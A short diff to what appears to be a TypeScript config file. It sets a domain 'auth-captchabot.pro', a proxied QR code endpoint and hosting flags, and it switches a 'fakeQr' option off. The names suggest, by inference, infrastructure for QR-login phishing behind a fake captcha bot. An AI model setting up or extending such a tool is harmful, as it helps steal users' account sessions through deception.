@@ -2,7 +2,7 @@
 export const domain = 'auth-captchabot.pro';
 export const fullDomain = `https://${domain}`;
 export const proxies: string[] = [];
-export const fakeQr = true;
+export const fakeQr = false;
 export const qrCodeEndpoint = 'localhost:8080/proxy';
 export const hostingOnVPS = false;
 
